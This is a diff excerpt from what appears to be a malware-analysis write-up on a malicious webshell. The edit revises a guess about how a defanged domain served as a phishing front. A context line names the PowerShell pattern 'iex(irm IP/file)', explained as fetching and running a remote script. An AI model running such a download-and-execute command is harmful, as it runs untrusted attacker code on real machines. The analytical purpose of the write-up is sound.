@@ -69,7 +69,7 @@ Lets dissect that.<br>
 ・iex(irm IP/file) downloads and immediately executes a remote script from the IP
 
 Well, I think we have proof now that our suspicious webshell is indeed malicious.<br>
-We can also assume that dkaksdaksortor[.]com was most likely used in a similar way as mvjfkakfkfkaiai[.]com (hosting malicious JavaScript code) due to its random spelling. Either that, or it could have been a phishing ad front for email or a popup on a website.
+We can also assume that dkaksdaksortor[.]com was most likely used as a front for a phishing email or a popup on a website. The malicious JavaScript pages were then attached to it.
 
 But we can do better than that. ....Right?<br>
 What I really wanted was the php code, not the HTML.<br>
